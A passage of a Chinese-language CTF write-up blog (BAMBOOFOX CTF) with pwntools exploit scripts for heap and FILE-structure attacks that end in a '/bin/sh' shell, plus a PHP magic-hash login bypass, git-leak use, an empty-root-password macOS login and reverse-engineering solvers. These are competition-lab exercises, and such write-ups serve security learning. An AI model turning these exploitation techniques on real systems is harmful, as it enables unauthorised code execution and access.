class="line">add_chant(<span class="number">2</span>,<span class="number">0x20</span>,<span class="string">'bbbbbbbbbb'</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#z('b*0x0000000000400981\nc')</span></span><br><span class="line">pay = p64(<span class="number">0x602002</span><span class="number">-8</span>)</span><br><span class="line">add_chant(<span class="number">0</span>,<span class="number">0x50</span>,pay)</span><br><span class="line">add_chant(<span class="number">1</span>,<span class="number">0x50</span>,<span class="string">'asdasd'</span>)</span><br><span class="line">add_chant(<span class="number">2</span>,<span class="number">0x50</span>,<span class="string">'asdasd'</span>)</span><br><span class="line">add_chant(<span class="number">3</span>,<span class="number">0x50</span>,<span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">14</span>)+p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag:<code>BAMBOOFOX{Hehehe...R3M3m6er_t0_s3T_Ni1_aFt3r_Fr3333333}</code></p>
+<h2 id="toddler-notakto-500"><a href="#toddler-notakto-500" class="headerlink" title="toddler-notakto 500"></a>toddler-notakto 500</h2><p>这题是FILE结构体的利用,还是比较有难度的.</p>
+<p>首先程序有两个漏洞:<br>1.输入名字的时候有溢出,而且没有零截断,正好可以leak出ret地址,从而得到libc基地址.<br>2.下棋的时候,没有检查边界,由于他是在所下的位置写0来标记,所以有了一个任意地址写0的漏洞.</p>
+<p>但是任意地址写零太局限了,很难利用,所以分两步完成.</p>
+<p>目标是stdin的<code>_IO_buf_base</code>.<br><code>buf_base</code>和<code>buf_end</code>决定了scanf的buf,对<code>buf_base</code>最低位写0从而将stdin的结构体包在buf内,从而能够改写stdin的多数结构体成员,再次改写<code>buf_base</code>和<code>buf_end</code>到got,从而got hijack,想接下来马上call的puts写onegadget即可getshell.(注意onegadget的局限,我选择rax==NULL的,只需让scanf返回0即可</p>
+<p>详细的利用可以参考angelboy的silde.<br><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique" target="_blank" rel="noopener">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></p>
+<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">'./toddler-notakto'</span>)</span><br><span class="line">	bin = ELF(<span class="string">'./toddler-notakto'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">"bamboofox.cs.nctu.edu.tw"</span>, <span class="number">58797</span>)</span><br><span class="line">	bin = ELF(<span class="string">'./toddler-notakto'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.23.so-14c22be9aa11316f89909e4237314e009da38883'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_zero</span><span class="params">(addr)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'Your move: '</span>)</span><br><span class="line">	cn.sendline(str(addr-board))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">cn.send(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">libc.address = u64(cn.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.sym[<span class="string">'__libc_start_main'</span>]<span class="number">-240</span></span><br><span class="line">success(<span class="string">'libc_base: '</span>+hex(libc.address))</span><br><span class="line"></span><br><span class="line">board=<span class="number">0x0000000000602080</span></span><br><span class="line">stdin__IO_buf_base = libc.sym[<span class="string">"_IO_2_1_stdin_"</span>] + <span class="number">0x38</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	onegadget = libc.address+<span class="number">0x45216</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">write_zero(stdin__IO_buf_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">'move: '</span>)</span><br><span class="line">pay = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(bin.got[<span class="string">'puts'</span>]) + p64(bin.got[<span class="string">'puts'</span>] + <span class="number">0x78</span>) + p64(<span class="number">0</span>)</span><br><span class="line">cn.sendline(pay)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">z(<span class="string">'b*0x0000000000400DC1\nc'</span>)</span><br><span class="line">pay = <span class="string">'\x00'</span>*<span class="number">0x20</span> +p64(onegadget)</span><br><span class="line">cn.sendline(pay)</span><br><span class="line">cn.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216	execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a	execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4	execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147	execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
+<hr>
+<h1 id="programming"><a href="#programming" class="headerlink" title="programming"></a>programming</h1><hr>
+<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="little-asm-50"><a href="#little-asm-50" class="headerlink" title="little-asm 50"></a>little-asm 50</h2><p>简单的异或.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'9E9D919E93939A9384A785ECA983E88E9983BD839BECEC98839DE991838EEFBD98B9AEA1'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">key = <span class="number">0xdc</span></span><br><span class="line"></span><br><span class="line">out=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">	out+=chr(ord(a[i])^key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> out</span><br></pre></td></tr></table></figure>
+<h2 id="little-asm-revenge-50"><a href="#little-asm-revenge-50" class="headerlink" title="little-asm-revenge 50"></a>little-asm-revenge 50</h2><p>由于是诸位的加密,偷个懒,直接上爆破了.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(n)</span>:</span></span><br><span class="line">	r = n</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">		<span class="keyword">if</span> i&amp;<span class="number">1</span>:</span><br><span class="line">			r ^= <span class="number">1</span>&lt;&lt;i</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			r |= <span class="number">1</span>&lt;&lt;i</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(n)</span>:</span></span><br><span class="line">	r = <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">		r = (n*r)%<span class="number">481</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc=[<span class="number">0x19C</span>,<span class="number">0x169</span>,<span class="number">0x30</span>,<span class="number">0x1D6</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x199</span>,<span class="number">0x6A</span>,<span class="number">0x157</span>,<span class="number">0xc2</span>,</span><br><span class="line"><span class="number">0x10A</span>,<span class="number">0x155</span>,<span class="number">0x150</span>,<span class="number">0x107</span>,<span class="number">0x37</span>,<span class="number">0x12E</span>,<span class="number">0x22</span>,<span class="number">0x0F1</span>,<span class="number">0x1AE</span>,</span><br><span class="line"><span class="number">0x151</span>,<span class="number">0x0F1</span>,<span class="number">0x1A</span>,<span class="number">0x1A5</span>,<span class="number">0x1AE</span>,<span class="number">0x0C9</span>,<span class="number">0x12C</span>,<span class="number">0x1</span>,<span class="number">0x166</span>,<span class="number">0x12c</span>,</span><br><span class="line"><span class="number">0x0CB</span>,<span class="number">0x30</span>,<span class="number">0x107</span>,<span class="number">0x166</span>,<span class="number">0x1B4</span>,<span class="number">0x1AE</span>,<span class="number">0x14C</span>,<span class="number">0x46</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">out =<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">		s = ord(c) ^ func1(i)</span><br><span class="line">		s = func2(s)</span><br><span class="line">		<span class="keyword">if</span> s == enc[i]:</span><br><span class="line">			out+=c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> out</span><br></pre></td></tr></table></figure>
+<h2 id="little-asm-impossible-95"><a href="#little-asm-impossible-95" class="headerlink" title="little-asm-impossible 95"></a>little-asm-impossible 95</h2><p>乍一看这个函数很复杂,但是,提供的两个参数只在最后参与计算,所以只需要dump出最后<code>sub_555555554FC3</code>的返回值即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">func1</span><span class="params">(<span class="keyword">int</span> c, <span class="keyword">int</span> ii)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  sub_5555555547B0(<span class="number">0</span>);</span><br><span class="line">  v17 = sub_555555554CBD(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    v15 += sub_55555555484F(v17);</span><br><span class="line">  v2 = sub_555555554D29(v17);</span><br><span class="line">  v3 = sub_555555554D98(v2);</span><br><span class="line">  v4 = sub_555555554993(v15);</span><br><span class="line">  v5 = (<span class="keyword">unsigned</span> __int64)sub_5555555548F1(v4) * v15;</span><br><span class="line">  v6 = sub_555555554E07(v3);</span><br><span class="line">  sub_555555554A35(v5 + v6);</span><br><span class="line">  v7 = sub_555555554E76(v6);</span><br><span class="line">  v8 = sub_555555554EE5(v7);</span><br><span class="line">  v9 = v8;</span><br><span class="line">  v10 = sub_555555554B79(v5 ^ v8);</span><br><span class="line">  v11 = (<span class="keyword">unsigned</span> __int64)sub_555555554AD7(v10) | v5;</span><br><span class="line">  v12 = sub_555555554F54(v9);</span><br><span class="line">  v13 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v11 % (<span class="keyword">signed</span> <span class="keyword">int</span>)sub_555555554C1B(v11);</span><br><span class="line">  <span class="keyword">return</span> ii ^ (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_555555554FC3(v12) ^ c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>调试后发现,<code>sub_555555554FC3</code>的返回值永远为0,所以前面哪些函数都是junk code.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'42404F414B4A404850723B546A3C406B4F504D5F7B6149277E46706E52764159554F61571515485A'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">out=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">	out += chr(ord(enc[i])^i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> out</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><hr>
+<h1 id="forensic"><a href="#forensic" class="headerlink" title="forensic"></a>forensic</h1><h2 id="net-packet-50"><a href="#net-packet-50" class="headerlink" title="net-packet 50"></a>net-packet 50</h2><p>先file一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log-packet: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 262144)</span><br></pre></td></tr></table></figure></p>
+<p>那果断wireshark启动</p>
+<p>其中有一条:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Want to get the flag?</span><br><span class="line">Of course~</span><br><span class="line">BAMBOOF</span><br><span class="line">OX&#123;Ne</span><br><span class="line">tL0g&#125;</span><br><span class="line">Thanks, bye!</span><br></pre></td></tr></table></figure>
+<p>flag:<code>BAMBOOFOX{NetL0g}</code></p>
+<h2 id="BambooFox-app-50"><a href="#BambooFox-app-50" class="headerlink" title="BambooFox-app 50"></a>BambooFox-app 50</h2><p>本地无法安装,只能拖jeb里.</p>
+<p>发现flag…</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object Button1$Click() &#123;</span><br><span class="line">    Object v0;</span><br><span class="line">    runtime.setThisForm();</span><br><span class="line">    <span class="keyword">if</span>(runtime.callYailPrimitive(Scheme.numGEq, LList.list2(runtime.lookupGlobalVarInCurrentFormEnvironment(Screen1.Lit3, runtime.$Stthe$Mnnull$Mnvalue$St), Screen1.Lit21), Screen1.Lit22, <span class="string">"&gt;="</span>) != Boolean.FALSE) &#123;</span><br><span class="line">        runtime.setAndCoerceProperty$Ex(Screen1.Lit19, Screen1.Lit23, Boolean.FALSE, Screen1.Lit24);</span><br><span class="line">        runtime.setAndCoerceProperty$Ex(Screen1.Lit19, Screen1.Lit16, <span class="string">"QkFNQk9PRk9Ye2phVmFfNFBQX2k1X2VhU3lfdDBfRDNjMG1waTFlfQ=="</span>, Screen1.Lit9);</span><br><span class="line">        v0 = runtime.callComponentMethod(Screen1.Lit25, Screen1.Lit26, LList.list1(<span class="string">"Flag in somewhere"</span>), Screen1.Lit27);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        runtime.callComponentMethod(Screen1.Lit25, Screen1.Lit26, LList.list1(<span class="string">"Try harder!!!"</span>), Screen1.Lit28);</span><br><span class="line">        v0 = runtime.addGlobalVarToCurrentFormEnvironment(Screen1.Lit3, runtime.callYailPrimitive(AddOp.$Pl, LList.list2(runtime.lookupGlobalVarInCurrentFormEnvironment(Screen1.Lit3, runtime.$Stthe$Mnnull$Mnvalue$St), Screen1.Lit29), Screen1.Lit30, <span class="string">"+"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>base64解码即可</p>
+<p>flag;<code>BAMBOOFOX{jaVa_4PP_i5_eaSy_t0_D3c0mpi1e}</code></p>
+<hr>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="suck-login-50"><a href="#suck-login-50" class="headerlink" title="suck-login 50"></a>suck-login 50</h2><p>题目说密码的md5值为<code>0e836584205638841937695747769655</code>,看到0e开头,那应该是PHP处理0e开头md5哈希字符串的bug了.</p>
+<p>随便用一组<br>QNKCDZO<br>0e830400451993494058024219903391</p>
+<p>flag:<code>BAMBOOFOX{pHp_cOnv3rt_sTring_T0_1nt3Ger_4ut0matIca11y}</code></p>
+<h2 id="tiny-git-50"><a href="#tiny-git-50" class="headerlink" title="tiny-git 50"></a>tiny-git 50</h2><p>看到git考虑git泄露</p>
+<p>有工具<a href="https://github.com/WangYihang/GitHacker" target="_blank" rel="noopener">https://github.com/WangYihang/GitHacker</a></p>
+<p>拖回git后,在log里发现flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">commit 525bbb7f703d5ed25204404cebcf01ef3ba87878</span><br><span class="line">Author: CALee &lt;sz110010@gmail.com&gt;</span><br><span class="line">Date:   Sat Dec 30 11:11:38 2017 +0800</span><br><span class="line"></span><br><span class="line">    hide BAMBOOFOX&#123;hiDeiN5IDeg1T&#125;</span><br><span class="line"></span><br><span class="line">commit 3f931b1998ab98cb4e9a70fda4a89e967cc07481</span><br><span class="line">Author: CALee &lt;sz110010@gmail.com&gt;</span><br><span class="line">Date:   Sat Dec 30 10:59:16 2017 +0800</span><br><span class="line"></span><br><span class="line">    ADD flag</span><br><span class="line"></span><br><span class="line">commit 36c87263e4dd53addb7437befb1bedc3aa8a7596</span><br><span class="line">Author: CALee &lt;sz110010@gmail.com&gt;</span><br><span class="line">Date:   Sat Dec 30 10:55:13 2017 +0800</span><br><span class="line"></span><br><span class="line">    Add bootstrap CSS</span><br><span class="line"></span><br><span class="line">commit 03269f7aba9056cb167d0e82077d676b74d87770</span><br><span class="line">Author: CALee &lt;sz110010@gmail.com&gt;</span><br><span class="line">Date:   Sat Dec 30 10:42:52 2017 +0800</span><br><span class="line"></span><br><span class="line">    Add title</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="suck-browser-50"><a href="#suck-browser-50" class="headerlink" title="suck-browser 50"></a>suck-browser 50</h2><p>题目说<code>I hate browser. It sucks.</code></p>
+<p>所以用curl就行了</p>
+<p><code>curl http://bamboofox.cs.nctu.edu.tw:33333</code></p>
+<p>检测原理貌似是检测UA,没有UA就能通过了.</p>
+<h2 id="suck-file-50"><a href="#suck-file-50" class="headerlink" title="suck-file 50"></a>suck-file 50</h2><p>没啥意思,循环套压缩包,把头从’PK’改成’pk’.</p>
+<p>我们就循环把头改成’PK’,然后解压.</p>
+<p>用python完成即可.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">fname = <span class="string">"a79cc81251ba4c66ed91ccd01b423598818a76cf"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    data = open(fname,<span class="string">'rb'</span>).read()</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">"pk"</span>):</span><br><span class="line">        open(fname, <span class="string">"wb"</span>).write(<span class="string">"PK"</span> + data[<span class="number">2</span>:])</span><br><span class="line">    z = zipfile.ZipFile(fname)</span><br><span class="line">    fname = z.namelist()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> fname</span><br><span class="line">    z.extractall()</span><br></pre></td></tr></table></figure>
+<p>flag:<code>BAMBOOFOX{Fil3_hE4d3r_15_imp0rtaNt}</code></p>
+<h2 id="suck-apple-50"><a href="#suck-apple-50" class="headerlink" title="suck-apple 50"></a>suck-apple 50</h2><p>试了一会,一开始以为要从web方面考虑</p>
+<p>但这是misc题,想到了之前mac的那个漏洞,root无密码登陆.</p>
+<p>于是account填root,密码空,就进去了…..</p>
+<p>flag:<code>BAMBOOFOX{3v3Ry0sHaVEbUG}</code></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Veritas501</li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://veritas501.github.io/2018/02/10/BAMBOOFOX CTF 部分 writeup/" title="BAMBOOFOX CTF 部分 writeup">https://veritas501.github.io/2018/02/10/BAMBOOFOX CTF 部分 writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/31/画个画吧/" rel="next" title="画个画吧">
+                <i class="fa fa-chevron-left"></i> 画个画吧
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/20/从零开始写一个CHIP-8模拟器/" rel="prev" title="从零开始写一个CHIP-8模拟器">
+                从零开始写一个CHIP-8模拟器 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
